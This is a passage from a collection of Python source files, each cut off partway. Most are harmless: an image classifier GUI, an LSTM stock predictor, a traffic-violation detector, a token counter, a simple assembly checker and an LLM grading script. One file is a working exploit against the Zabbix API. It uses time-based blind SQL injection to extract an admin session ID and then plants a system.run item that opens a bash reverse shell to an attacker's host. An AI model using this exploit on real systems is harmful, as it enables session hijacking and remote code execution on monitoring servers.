os.walk(directory):\n        for file in files:\n            all_files.append(os.path.join(root, file))\n\n    # add progress bar\n    for file_path in tqdm(all_files, desc=\"Processing files\", unit=\"file\"):\n        if file_path.endswith(\"Thumbs.db\"):\n            print(f\"Suppress {file_path}\")\n            os.remove(file_path)\n        else:\n            update_file_creation_date(file_path)\n\n\nif __name__ == \"__main__\":\n    import sys\n\n    directory = sys.argv[1] if len(sys.argv) > 1 else os.getcwd()\n    print(directory)\n    main(directory)\n",
    "import tkinter as tk\nfrom tkinter import filedialog\nfrom tkinter import messagebox\nfrom tensorflow.keras.preprocessing import image\nimport numpy as np\nimport tensorflow as tf\nfrom deep_translator import GoogleTranslator\n\n# \u0417\u0430\u0433\u0440\u0443\u0437\u043a\u0430 \u043f\u0440\u0435\u0434\u043e\u0431\u0443\u0447\u0435\u043d\u043d\u043e\u0439 \u043c\u043e\u0434\u0435\u043b\u0438\nmodel = tf.keras.applications.MobileNetV2(weights='imagenet')\n\n# \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u043f\u0435\u0440\u0435\u0432\u043e\u0434\u0430 \u043c\u0435\u0442\u043a\u0438 \u043d\u0430 \u0440\u0443\u0441\u0441\u043a\u0438\u0439\ndef translate_to_russian(label):\n    try:\n        translation = GoogleTranslator(source='en', target='ru').translate(label)\n        return translation\n    except Exception as e:\n        return label  # \u0415\u0441\u043b\u0438 \u043e\u0448\u0438\u0431\u043a\u0430, \u0432\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u043c \u043e\u0440\u0438\u0433\u0438\u043d\u0430\u043b\u044c\u043d\u044b\u0439 \u0442\u0435\u043a\u0441\u0442\n\n# \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u043a\u043b\u0430\u0441\u0441\u0438\u0444\u0438\u043a\u0430\u0446\u0438\u0438 \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044f \u0441 \u043d\u0435\u0441\u043a\u043e\u043b\u044c\u043a\u0438\u043c\u0438 \u043f\u0440\u0435\u0434\u0441\u043a\u0430\u0437\u0430\u043d\u0438\u044f\u043c\u0438\ndef classify_image(img_path):\n    img = image.load_img(img_path, target_size=(224, 224))\n    img_array = image.img_to_array(img)\n    img_array = np.expand_dims(img_array, axis=0)\n    img_array = tf.keras.applications.mobilenet_v2.preprocess_input(img_array)\n\n    predictions = model.predict(img_array)\n    decoded_predictions = tf.keras.applications.mobilenet_v2.decode_predictions(predictions, top=3)[0]\n\n    results = []\n    for pred in decoded_predictions:\n        label = pred[1]  # \u041d\u0430\u0437\u0432\u0430\u043d\u0438\u0435 \u043a\u043b\u0430\u0441\u0441\u0430 \u043d\u0430 \u0430\u043d\u0433\u043b\u0438\u0439\u0441\u043a\u043e\u043c\n        confidence = pred[2]\n        russian_label = translate_to_russian(label)\n        results.append((russian_label, confidence))\n    return results\n\n# \u041e\u0431\u043d\u043e\u0432\u043b\u0451\u043d\u043d\u0430\u044f \u0444\u0443\u043d\u043a\u0446\u0438\u044f \u0437\u0430\u0433\u0440\u0443\u0437\u043a\u0438 \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044f\ndef upload_image():\n    file_path = filedialog.askopenfilename(title=\"\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u0435\", filetypes=[(\"Image Files\", \"*.png;*.jpg;*.jpeg\")])\n    if file_path:\n        results = classify_image(file_path)\n        result_text = \"\u0420\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442\u044b:\\n\"\n        for i, (label, confidence) in enumerate(results, 1):\n            result_text += f\"{i}. {label} (\u0443\u0432\u0435\u0440\u0435\u043d\u043d\u043e\u0441\u0442\u044c: {confidence * 100:.2f}%)\\n\"\n        result_label.config(\n            text=result_text,\n            fg=\"black\",\n            bg=\"white\",\n        )\n    else:\n        messagebox.showerror(\"\u041e\u0448\u0438\u0431\u043a\u0430\", \"\u0412\u044b \u043d\u0435 \u0432\u044b\u0431\u0440\u0430\u043b\u0438 \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u0435!\")\n\n# \u0421\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u0433\u0440\u0430\u0444\u0438\u0447\u0435\u0441\u043a\u043e\u0433\u043e \u0438\u043d\u0442\u0435\u0440\u0444\u0435\u0439\u0441\u0430\nroot = tk.Tk()\nroot.title(\"\u041a\u043b\u0430\u0441\u0441\u0438\u0444\u0438\u043a\u0430\u0442\u043e\u0440 \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u0439 \u0436\u0438\u0432\u043e\u0442\u043d\u044b\u0445\")\n\n# \u041d\u0430\u0441\u0442\u0440\u043e\u0439\u043a\u0430 \u0440\u0430\u0437\u043c\u0435\u0440\u043e\u0432 \u0438 \u0444\u043e\u043d\u0430\nroot.geometry(\"600x400\")\nroot.configure(bg=\"#f0f8ff\")  # \u0421\u0432\u0435\u0442\u043b\u043e-\u0433\u043e\u043b\u0443\u0431\u043e\u0439 \u0444\u043e\u043d\n\n# \u0412\u0435\u0440\u0445\u043d\u044f\u044f \u0447\u0430\u0441\u0442\u044c\nheader_frame = tk.Frame(root, bg=\"#4682b4\", height=80)\nheader_frame.pack(fill=tk.X)\n\nheader_label = tk.Label(\n    header_frame,\n    text=\"\u041a\u043b\u0430\u0441\u0441\u0438\u0444\u0438\u043a\u0430\u0442\u043e\u0440 \u0436\u0438\u0432\u043e\u0442\u043d\u044b\u0445\",\n    font=(\"Arial\", 20, \"bold\"),\n    bg=\"#4682b4\",\n    fg=\"white\",\n)\nheader_label.pack(pady=20)\n\n# \u041e\u0441\u043d\u043e\u0432\u043d\u043e\u0439 \u0442\u0435\u043a\u0441\u0442\ninstruction_label = tk.Label(\n    root,\n    text=\"\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u0435 \u0434\u043b\u044f \u0430\u043d\u0430\u043b\u0438\u0437\u0430.\",\n    font=(\"Arial\", 14),\n    bg=\"#f0f8ff\",\n    fg=\"black\",\n)\ninstruction_label.pack(pady=20)\n\n# \u041a\u043d\u043e\u043f\u043a\u0430 \u0437\u0430\u0433\u0440\u0443\u0437\u043a\u0438 \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044f\nupload_button = tk.Button(\n    root,\n    text=\"\u0417\u0430\u0433\u0440\u0443\u0437\u0438\u0442\u044c \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u0435\",\n    font=(\"Arial\", 12, \"bold\"),\n    bg=\"#4682b4\",\n    fg=\"white\",\n    activebackground=\"#5f9ea0\",\n    activeforeground=\"white\",\n    command=upload_image,\n    relief=tk.RAISED,\n    bd=3,\n)\nupload_button.pack(pady=10)\n\n# \u041f\u043e\u043b\u0435 \u0434\u043b\u044f \u0432\u044b\u0432\u043e\u0434\u0430 \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442\u0430\nresult_label = tk.Label(\n    root,\n    text=\"\u0420\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442: --\",\n    font=(\"Arial\", 14),\n    bg=\"#f0f8ff\",\n    fg=\"black\",\n    wraplength=500,  # \u041f\u0435\u0440\u0435\u043d\u043e\u0441 \u0442\u0435\u043a\u0441\u0442\u0430, \u0435\u0441\u043b\u0438 \u043e\u043d \u0434\u043b\u0438\u043d\u043d\u044b\u0439\n    justify=\"center\",\n    relief=tk.SUNKEN,\n    bd=2,\n    height=5,\n)\nresult_label.pack(pady=20, padx=20, fill=tk.X)\n\n# \u041d\u0438\u0436\u043d\u044f\u044f \u0447\u0430\u0441\u0442\u044c\nfooter_label = tk.Label(\n    root,\n    text=\"\u0420\u0430\u0437\u0440\u0430\u0431\u043e\u0442\u0430\u043d\u043e \u0441 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u043d\u0438\u0435\u043c TensorFlow \u0438 Python\",\n    font=(\"Arial\", 10),\n    bg=\"#4682b4\",\n    fg=\"white\",\n)\nfooter_label.pack(side=tk.BOTTOM, fill=tk.X)\n\nroot.mainloop()\n",
    "import numpy as np\nimport pandas as pd\nimport matplotlib.pyplot as plt\nimport yfinance as yf\nimport datetime as dt\nfrom sklearn.preprocessing import MinMaxScaler\nimport torch\nimport torch.nn as nn\nfrom torch.utils.data import DataLoader, TensorDataset\nfrom torch.optim.lr_scheduler import ReduceLROnPlateau\nimport copy\n\n# Device configuration\ndevice = torch.device('cuda' if torch.cuda.is_available() else 'cpu')\n\n# Load from yahoo\ndef fetch_data(ticker, start, end):\n    try:\n        data = yf.download(ticker, start=start, end=end)\n        if data.empty:\n            raise ValueError(f\"No data found for {ticker}. Check the ticker or date range.\")\n        return data\n    except Exception as e:\n        print(f\"Error fetching data: {e}\")\n        exit()\n\ncompany = 'MSFT'\nstart = dt.datetime(2010, 1, 1)\nend = dt.datetime(2023, 1, 1)  # Reduced end date for more realistic test data\ndata = fetch_data(company, start, end)\n\n# Preprocessing\nscaler = MinMaxScaler(feature_range=(0, 1))\nscaled_data = scaler.fit_transform(data['Close'].values.reshape(-1, 1))\n\nprediction_days = 1\nx, y = [], []\n\nfor i in range(prediction_days, len(scaled_data)):\n    x.append(scaled_data[i - prediction_days:i, 0])\n    y.append(scaled_data[i, 0])\n\nx, y = np.array(x), np.array(y)\nx = torch.from_numpy(x).float().unsqueeze(-1).to(device)\ny = torch.from_numpy(y).float().to(device)\n\n\n# Split data into training and validation sets (80/20 split)\ntrain_size = int(0.8 * len(x))\nx_train, x_val = x[:train_size], x[train_size:]\ny_train, y_val = y[:train_size], y[train_size:]\n\ntrain_dataset = TensorDataset(x_train, y_train)\ntrain_loader = DataLoader(train_dataset, batch_size=32, shuffle=True)\nval_dataset = TensorDataset(x_val, y_val)\nval_loader = DataLoader(val_dataset, batch_size=32, shuffle=False)\n\nclass LSTM(nn.Module):\n    def __init__(self, input_size=1, hidden_layer_size=100, output_size=1, num_layers=4, dropout_rate=0.5):\n        super(LSTM, self).__init__()\n        self.hidden_layer_size = hidden_layer_size\n        self.num_layers = num_layers\n        self.lstm = nn.LSTM(input_size, hidden_layer_size, num_layers=num_layers, dropout=dropout_rate, batch_first=True)\n        self.linear = nn.Linear(hidden_layer_size, output_size)\n\n    def forward(self, x):\n        lstm_out, _ = self.lstm(x)\n        predictions = self.linear(lstm_out[:, -1])\n        return predictions\n\nmodel = LSTM()\nloss_function = nn.MSELoss()\noptimizer = torch.optim.AdamW(model.parameters(), lr=0.001, weight_decay=1e-6)\nscheduler = ReduceLROnPlateau(optimizer, 'min', patience=5, factor=0.5)  # Learning rate scheduler\n\nepochs = 50\nbest_val_loss = float('inf')\nbest_model_state = None\n\nfor epoch in range(epochs):\n    model.train()\n    total_train_loss = 0\n    for batch_x, batch_y in train_loader:\n        optimizer.zero_grad()\n        predictions = model(batch_x)\n        loss = loss_function(predictions, batch_y.unsqueeze(-1))\n        loss.backward()\n        optimizer.step()\n        total_train_loss += loss.item()\n\n    model.eval()\n    total_val_loss = 0\n    with torch.no_grad():\n        for batch_x, batch_y in val_loader:\n            predictions = model(batch_x)\n            loss = loss_function(predictions, batch_y.unsqueeze(-1))\n            total_val_loss += loss.item()\n\n    avg_train_loss = total_train_loss / len(train_loader)\n    avg_val_loss = total_val_loss / len(val_loader)\n\n    scheduler.step(avg_val_loss)  # Update learning rate based on validation loss\n\n    print(f\"Epoch {epoch+1}/{epochs}, Train Loss: {avg_train_loss:.4f}, Val Loss: {avg_val_loss:.4f}\")\n\n    if avg_val_loss < best_val_loss:\n        best_val_loss = avg_val_loss\n        best_model_state = copy.deepcopy(model.state_dict())\n\n# Load best model state\nmodel.load_state_dict(best_model_state)\n\ntest_data = fetch_data(company, start=end, end=dt.datetime.now())\ntotal_data = pd.concat((data['Close'], test_data['Close']), axis=0)\n\n\ninputs = total_data[len(total_data) - len(test_data) - prediction_days:].values # Corrected\ninputs = scaler.transform(inputs.reshape(-1, 1))\n\nx_test = []\nfor i in range(prediction_days, len(inputs)):\n    x_test.append(inputs[i - prediction_days:i, 0])\n\nx_test = torch.from_numpy(np.array(x_test)).float().unsqueeze(-1)\n\nmodel.eval()\nwith torch.no_grad():\n    predictions = model(x_test).squeeze()\n    predictions = scaler.inverse_transform(predictions.numpy().reshape(-1, 1))\n\n# Calculate Percent Accuracy of model vs actual prices\nactual_prices = test_data['Close'].values\npredicted_prices = predictions.flatten()\n\n\nif len(actual_prices) > len(predicted_prices):\n    actual_prices = actual_prices[:len(predicted_prices)]\n\n#prediction accuracy\nmape = np.mean(np.abs((actual_prices - predicted_prices) / actual_prices)) * 100\naccuracy = 100 - mape\n\nprint(f\"Mean Absolute Percentage Error (MAPE): {mape:.2f}%\")\nprint(f\"Prediction Accuracy: {accuracy:.2f}%\")\n\n#Investment Returns vs Actual Returns\ndef calculate_returns(investment, actual_prices, predicted_prices):\n\n    num_shares_actual = investment / actual_prices[0",
    "# Name: Aiman Adel Awadh Abdullah Mahmood\n# TP: TP065994\n# Project Title :\n# Supervisor: Dr. Murugananthan Velayutham\n# 2nd Marker: Assoc. Prof. Dr. Sivakumar Vengusamy\n# Degree : B.Sc. Computer Science (Hons) (Artificial intelligence)\n\nimport os\nimport cv2\nfrom tkinter import *\nfrom tkinter import filedialog\nimport numpy as np\nfrom PIL import Image, ImageTk\nimport Vehicle_detection as od #Importing a custom module for vehicle detection\n\nclass GUIWindow(Frame):\n    def __init__(self, window=None):\n        Frame.__init__(self, window)\n\n        # Initialize attributes\n        self.window = window\n        self.crosshair_positions = []\n        self.line_positions = []\n        self.rectangle_positions = []\n        self.window.title(\"GUI\")\n        self.pack(fill=BOTH, expand=1)\n        self.crosshair_counter = 0\n\n        # Define menu and add options\n        main_menu = Menu(self.window)\n        self.window.config(menu=main_menu)\n\n        main_menu.add_command(label=\"Import\", command=self.open_file)  # Option to import a video file\n        main_menu.add_cascade(label=\"Mark RoI\", command=self.draw_region_of_interest)  # Option to mark Region of Interest\n        main_menu.add_command(label=\"Exit\", command=self.exit_client)  # Option to exit the program\n        self.window.resizable(False, False)\n\n        # Initial Home page image to show\n        self.image_path = \"resources/splash_screen.png\"\n        self.image_to_show = Image.open(self.image_path)\n        self.photo_image = ImageTk.PhotoImage(self.image_to_show)\n        self.canvas_width, self.canvas_height = (1366, 768)\n\n        # Define canvas and add initial image\n        self.canvas = Canvas(master=window, width=self.canvas_width, height=self.canvas_height)\n        self.canvas = Canvas(master=window, width=self.canvas_width, height=self.canvas_height, bg=\"#12054d\")\n        self.canvas.create_image(20, 20, image=self.photo_image, anchor='nw')\n\n        self.canvas.pack()\n\n    def open_file(self):\n        self.image_path = filedialog.askopenfilename()  # Open file dialog to select a video file\n        video = cv2.VideoCapture(self.image_path)\n        _, image = video.read()\n        self.update_image(image)  # Update the canvas with the selected video frame\n\n    def update_image(self, image):\n        img_cv2 = cv2.cvtColor(image, cv2.COLOR_BGR2RGB)\n        self.image_to_show = Image.fromarray(img_cv2)\n        self.photo_image = ImageTk.PhotoImage(self.image_to_show)\n        self.canvas_width, self.canvas_height = (1366, 768)\n\n        # Destroy the previous canvas and create a new one\n        self.canvas.destroy()\n        self.canvas = Canvas(master=root, width=self.canvas_width, height=self.canvas_height)\n        self.canvas.create_image(0, 0, image=self.photo_image, anchor='nw')\n        self.canvas.pack()\n\n    def draw_region_of_interest(self):\n        root.config(cursor=\"plus\")\n        self.canvas.bind(\"<Button-1>\", self.record_crosshair_position)  # Bind left mouse click to record crosshair position\n\n    def exit_client(self):\n        exit()  # Exit the program\n\n    def record_crosshair_position(self, event):\n        if self.crosshair_counter < 2:\n            x = int(self.canvas.canvasx(event.x))\n            y = int(self.canvas.canvasy(event.y))\n            self.line_positions.append((x, y))\n            self.crosshair_positions.append(self.canvas.create_line(x - 5, y, x + 5, y, fill=\"red\", tags=\"crosshair\"))\n            self.crosshair_positions.append(self.canvas.create_line(x, y - 5, x, y + 5, fill=\"red\", tags=\"crosshair\"))\n            self.crosshair_counter += 1\n\n        if self.crosshair_counter == 2:\n            self.canvas.unbind(\"<Button-1>\")  # Unbind left mouse click\n            root.config(cursor=\"arrow\")\n            self.crosshair_counter = 0\n\n            self.draw_line_and_process_image()  # Draw line on the canvas and process the image\n\n            # Clearing things\n            self.line_positions.clear()\n            self.rectangle_positions.clear()\n            for i in self.crosshair_positions:\n                self.canvas.delete(i)\n\n    def draw_line_and_process_image(self):\n        img = np.array(self.image_to_show)\n        img = cv2.cvtColor(img, cv2.COLOR_RGB2BGR)\n        cv2.line(img, self.line_positions[0], self.line_positions[1], (0, 255, 0), 3)  # Draw a line on the image\n        self.update_image(img)  # Update the canvas with the modified image\n\n        self.detect_traffic_violation()  # Detect traffic violations using the marked Region of Interest\n\n    def detect_traffic_violation(self):\n        video_src = self.image_path\n        video = cv2.VideoCapture(video_src)\n        frame_counter = 1\n\n        while True:\n            ret, image = video.read()\n            if image is None:\n                break\n            image_h, image_w, _ = image.shape\n            new_image = od.preprocess_input(image, od.net_h, od.net_w)\n            yolos = od.yolov3.predict(new_image)\n            boxes = []\n\n            for i in range(len(yolos)):\n            ",
    "import tiktoken\n\ndef count_tokens(text: str, model: str = \"gpt-4\") -> int:\n    \"\"\"\n    Cuenta los tokens en un texto dado.\n    \n    Args:\n        text: El texto para contar tokens\n        model: El modelo a usar para el conteo (por defecto gpt-4)\n        \n    Returns:\n        int: N\u00famero de tokens\n    \"\"\"\n    try:\n        encoding = tiktoken.encoding_for_model(model)\n        return len(encoding.encode(text))\n    except Exception:\n        try:\n            # Fallback a cl100k_base si el modelo no est\u00e1 disponible\n            encoding = tiktoken.get_encoding(\"cl100k_base\")\n            return len(encoding.encode(text))\n        except Exception as e:\n            print(f\"Error contando tokens: {e}\")\n            return 0\n\ndef count_messages_tokens(messages: list, model: str = \"gpt-4\") -> int:\n    \"\"\"\n    Cuenta los tokens en una lista de mensajes.\n    \n    Args:\n        messages: Lista de diccionarios con los mensajes\n        model: El modelo a usar para el conteo\n        \n    Returns:\n        int: N\u00famero total de tokens\n    \"\"\"\n    total_tokens = 0\n    for message in messages:\n        # Contar tokens del contenido\n        total_tokens += count_tokens(message.get(\"content\", \"\"), model)\n        # A\u00f1adir tokens por el rol y formato (aproximaci\u00f3n)\n        total_tokens += 4  # ~4 tokens por mensaje para rol y formato\n    \n    return total_tokens",
    "import requests\r\nimport json\r\nfrom datetime import datetime\r\nimport string\r\nimport sys\r\nfrom concurrent.futures import ThreadPoolExecutor\r\n\r\nEXPECTED_RESPONSE_TIME = 1\r\nROW_INDEX = 0\r\n\r\ndef authenticate(api_url, username, password):\r\n    \"\"\"Authenticate the user and retrieve the authentication token.\"\"\"\r\n    payload = {\r\n        \"jsonrpc\": \"2.0\",\r\n        \"method\": \"user.login\",\r\n        \"params\": {\r\n            \"username\": username,\r\n            \"password\": password\r\n        },\r\n        \"id\": 1\r\n    }\r\n    response = requests.post(api_url, json=payload)\r\n    if response.status_code == 200:\r\n        try:\r\n            response_json = response.json()\r\n            auth_token = response_json.get(\"result\")\r\n            if auth_token:\r\n                print(f\"Login successful! Auth token: {auth_token}\")\r\n                return auth_token\r\n            else:\r\n                print(f\"Login failed. Response: {response_json}\")\r\n        except Exception as e:\r\n            print(f\"Error parsing response: {str(e)}\")\r\n    else:\r\n        print(f\"HTTP request failed with status code {response.status_code}\")\r\n    return None\r\n\r\ndef send_injection(api_url, auth_token, position, char):\r\n    \"\"\"Send an SQL injection payload and measure the response time.\"\"\"\r\n    payload = {\r\n        \"jsonrpc\": \"2.0\",\r\n        \"method\": \"user.get\",\r\n        \"params\": {\r\n            \"output\": [\"userid\", \"username\"],\r\n            \"selectRole\": [\r\n                \"roleid\",\r\n                f\"name AND (SELECT * FROM (SELECT(SLEEP({EXPECTED_RESPONSE_TIME} - \"\r\n                f\"(IF(ORD(MID((SELECT sessionid FROM zabbix.sessions \"\r\n                f\"WHERE userid=1 and status=0 LIMIT {ROW_INDEX},1), \"\r\n                f\"{position}, 1))={ord(char)}, 0, {EXPECTED_RESPONSE_TIME})))))BEEF)\"\r\n            ],\r\n            \"editable\": 1,\r\n        },\r\n        \"auth\": auth_token,\r\n        \"id\": 1\r\n    }\r\n    start_time = datetime.now().timestamp()\r\n    response = requests.post(api_url, json=payload)\r\n    end_time = datetime.now().timestamp()\r\n    response_time = end_time - start_time\r\n    return char, response_time\r\n\r\ndef test_characters_parallel(api_url, auth_token, position):\r\n    \"\"\"Test all printable characters in parallel for a specific position.\"\"\"\r\n    with ThreadPoolExecutor(max_workers=10) as executor:\r\n        futures = {\r\n            executor.submit(send_injection, api_url, auth_token, position, char): char\r\n            for char in string.printable\r\n        }\r\n        for future in futures:\r\n            char, response_time = future.result()\r\n            if EXPECTED_RESPONSE_TIME - 0.5 < response_time < EXPECTED_RESPONSE_TIME + 0.5:\r\n                return char\r\n    return None\r\n\r\ndef print_progress(extracted_value):\r\n    \"\"\"Print the extraction progress.\"\"\"\r\n    sys.stdout.write(f\"\\rExtracting admin session: {extracted_value}\")\r\n    sys.stdout.flush()\r\n\r\ndef extract_admin_session_parallel(api_url, auth_token):\r\n    \"\"\"Extract the admin session ID by testing characters in parallel.\"\"\"\r\n    extracted_value = \"\"\r\n    max_length = 32\r\n    for position in range(1, max_length + 1):\r\n        char = test_characters_parallel(api_url, auth_token, position)\r\n        if char:\r\n            extracted_value += char\r\n            print_progress(extracted_value)\r\n        else:\r\n            print(f\"\\n(-) No character found at position {position}, stopping.\")\r\n            break\r\n    return extracted_value\r\n\r\ndef get_host_ids(api_url, admin_session):\r\n    \"\"\"Retrieve current host IDs and their associated interface IDs.\"\"\"\r\n    payload = {\r\n        \"jsonrpc\": \"2.0\",\r\n        \"method\": \"host.get\",\r\n        \"params\": {\r\n            \"output\": [\"hostid\", \"host\"],\r\n            \"selectInterfaces\": [\"interfaceid\"]\r\n        },\r\n        \"auth\": admin_session,\r\n        \"id\": 1\r\n    }\r\n    response = requests.post(api_url, json=payload)\r\n    if response.status_code == 200:\r\n        try:\r\n            response_json = response.json()\r\n            print(f\"host.get response: {response_json}\")\r\n            result = response_json.get(\"result\", [])\r\n            if result:\r\n                host_id = result[0][\"hostid\"]\r\n                interface_id = result[0][\"interfaces\"][0][\"interfaceid\"]\r\n                return host_id, interface_id\r\n            else:\r\n                print(\"No hosts found in the response.\")\r\n                return None, None\r\n        except Exception as e:\r\n            print(f\"Error parsing response: {str(e)}\")\r\n            return None, None\r\n    else:\r\n        print(f\"Failed to retrieve host IDs. HTTP status code: {response.status_code}\")\r\n        return None, None\r\n\r\ndef send_reverse_shell_request(api_url, admin_session, lhost, lport, host_id, interface_id):\r\n    \"\"\"Send the reverse shell request to the target server.\"\"\"\r\n    payload = {\r\n        \"jsonrpc\": \"2.0\",\r\n        \"method\": \"item.create\",\r\n        \"params\": {\r\n            \"name\": \"rce\",\r\n            \"key_\": f\"system.run[bash -c \\\"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\\\"]\",\r\n            \"delay\": 1,\r\n         ",
    "# -*- coding: utf-8 -*-\r\n\"\"\"\r\nCreated on Thurs Jan  1 11:42:47 2025\r\n\r\n@author: IAN CARTER KULANI\r\n\"\"\"\r\n\r\nfrom colorama import Fore\r\nimport pyfiglet\r\nimport os\r\nfont=pyfiglet.figlet_format(\"ZERO BUG\")\r\nprint(Fore.GREEN+font)\r\n\r\nimport re\r\n\r\n# Function to read the assembly file\r\ndef read_file(file_path):\r\n    \"\"\"Reads the content of an assembly file.\"\"\"\r\n    try:\r\n        with open(file_path, 'r') as file:\r\n            return file.read()\r\n    except FileNotFoundError:\r\n        print(f\"Error: File {file_path} not found.\")\r\n        return None\r\n\r\n# Function to save the modified assembly code to a file\r\ndef save_file(file_path, content):\r\n    \"\"\"Saves the modified assembly content to a new file.\"\"\"\r\n    with open(file_path, 'w') as file:\r\n        file.write(content)\r\n    print(f\"File saved as {file_path}\")\r\n\r\n# Function to analyze assembly code for bugs\r\ndef analyze_code(code):\r\n    \"\"\"Analyzes assembly code for common bugs and issues.\"\"\"\r\n    bugs = []\r\n\r\n    # Recognize assembly instructions (JMP, MOV, ADD, etc.)\r\n    instructions = [\"JMP\", \"ADD\", \"MOV\", \"MUL\", \"DIV\"]\r\n    for instr in instructions:\r\n        if instr not in code:\r\n            bugs.append(f\"Warning: Missing {instr} instruction.\")\r\n    \r\n    # Recognizing and detecting misuse of C-style keywords (e.g., int, float, char) in assembly code\r\n    c_keywords = [\"int\", \"float\", \"char\", \"double\", \"sizeof\", \"typedef\", \"register\", \"union\", \"for\", \"while\", \r\n                  \"struct\", \"static\", \"long\", \"short\", \"packed\", \"return\", \"goto\"]\r\n    \r\n    for keyword in c_keywords:\r\n        if keyword in code:\r\n            bugs.append(f\"Warning: C-style keyword '{keyword}' found in assembly code. This may indicate an issue.\")\r\n\r\n    # Check for jumps (e.g., 'JMP') without labels\r\n    missing_labels = re.findall(r'\\bJMP\\b(?!\\s+[A-Za-z_][A-Za-z0-9_]*)', code)\r\n    if missing_labels:\r\n        for _ in missing_labels:\r\n            code = code.replace(\"JMP\", \"JMP DEFAULT_LABEL\")  # Add a default label for simplicity\r\n        bugs.append(\"Added default labels for 'JMP' statements.\")\r\n\r\n    # Check for common uninitialized register usage (e.g., using registers without initialization)\r\n    uninitialized_registers = re.findall(r'(\\b[A-Za-z]{2,3}\\b)\\s*,\\s*\\d+', code)  # e.g., MOV AX, 5\r\n    if uninitialized_registers:\r\n        for reg in uninitialized_registers:\r\n            bugs.append(f\"Warning: Potential uninitialized register usage for {reg}.\")\r\n    \r\n    # Check for redundant NOP instructions (no operation)\r\n    redundant_nops = re.findall(r'\\bNOP\\b\\s*\\n', code)\r\n    if redundant_nops:\r\n        code = re.sub(r'\\bNOP\\b\\s*\\n', '', code)  # Remove redundant NOPs\r\n        bugs.append(\"Removed redundant 'NOP' instructions.\")\r\n\r\n    # Check for improper arithmetic usage (e.g., DIV by zero or misuse of instructions)\r\n    if \"DIV\" in code:\r\n        div_by_zero = re.findall(r'DIV\\s*,\\s*0', code)\r\n        if div_by_zero:\r\n            bugs.append(\"Warning: Division by zero detected in the code.\")\r\n    \r\n    return code, bugs\r\n\r\n# Function to prompt user for file path, read file, analyze, fix, and save\r\ndef main():\r\n    print(\"Welcome to the Binary Analysis Tool!\")\r\n\r\n    # Prompt user for the path to the assembly file\r\n    file_path = input(\"Enter the path to the assembly file: \").strip()\r\n\r\n    # Read the file content\r\n    code = read_file(file_path)\r\n    \r\n    if code:\r\n        # Analyze and check for bugs\r\n        modified_code, bugs = analyze_code(code)\r\n        \r\n        # Show the detected bugs to the user\r\n        if bugs:\r\n            print(\"\\nDetected issues and bugs:\")\r\n            for bug in bugs:\r\n                print(f\"- {bug}\")\r\n        else:\r\n            print(\"\\nNo bugs detected. The code appears to be fine.\")\r\n        \r\n        # Prompt the user for the path to save the modified file\r\n        save_path = input(\"Enter the path to save the modified file: \").strip()\r\n        save_file(save_path, modified_code)\r\n\r\nif __name__ == \"__main__\":\r\n    main()\r\n",
    "import json\nimport os\nfrom openai import OpenAI\nimport time\nimport re\n\ndef match_score(prompt):\n    retry_limit = 10\n    eval_model = OpenAI(api_key=os.environ.get(\"OPENAI_API_KEY\"))\n\n    for retry in range(retry_limit):\n        try:\n            response = eval_model.chat.completions.create(\n                model=\"gpt-4o\",\n                messages=[\n                    {\"role\": \"user\", \"content\": prompt},\n                ],\n                temperature=0.0,\n            )\n            score = response.choices[0].message.content\n            return int(score.strip())\n        except Exception as e:\n            time.sleep(1)\n    return 'Failed'\n\ndef compute_acc_single(ex, pred):\n    pred = pred.replace('||', '|')\n    solution = ex[\"answer\"]\n    # Use regex to find text between 'FINAL ANSWER:' and 'TERMINATE'\n    result = re.search(r'FINAL ANSWER:\\s*(.*?)\\s*TERMINATE', pred)\n\n    # Extract the matched text if found\n    prediction = result.group(1) if result else pred\n    answer_score = 0\n    grading_query = f'''\n    Rate my prediction given the correct answer.\n    Prediction: {prediction}\n    Answer: {solution}\n    If you think the prediction is correct, return 1, otherwise return 0. Return 0 or 1 only.'''\n    answer_score = match_score(grading_query)\n    return answer_score, prediction, solution\n\n\ndef compute_acc_from_raw_answer(question, solution, pred):\n    pred = pred.replace('||', '|')\n    result = re.search(r'FINAL ANSWER:\\s*(.*?)\\s*TERMINATE', pred)\n\n    # Extract the matched text if found\n    prediction = result.group(1) if result else pred\n    answer_score = 0\n    grading_query = f'''\n    You are given a prediction for the question. You need to rate it given the correct answer. Disregard the format, and only rate based on the content. If you think the prediction is correct, i.e. same as the correct answer, then return 1, otherwise return 0. Return 0 or 1 only.\n\n    # Example\n    # Question: What is the height of the tower?\n    # Prediction: ANSWER: The tower is built in China from 200 years ago. The total hight of the tower is 180 Meters. TERMINATE\n    # Correct Answer: 80 Meters\n    # Your Response: 0\n\n    # Example\n    # Question: What is the difference?\n    # Prediction: ANSWER: 69%. TERMINATE\n    # Correct Answer: 69\n    # Your Response: 1\n\n    # Example\n    # Question: What is the increase?\n    # Prediction: ANSWER: 3%. TERMINATE\n    # Correct Answer: 0.03\n    # Your Response: 1\n\n    # Example\n    # Question: What is the ratio?\n    # Prediction: ANSWER: 1.541. TERMINATE\n    # Correct Answer: 1.54\n    # Your Response: 1\n\n    # Question: {question}\n    # Prediction: {prediction}\n    # Correct Answer: {solution}\n    # Your Response:'''\n    # print(grading_query)\n    answer_score = match_score(grading_query)\n    return answer_score, prediction\n",
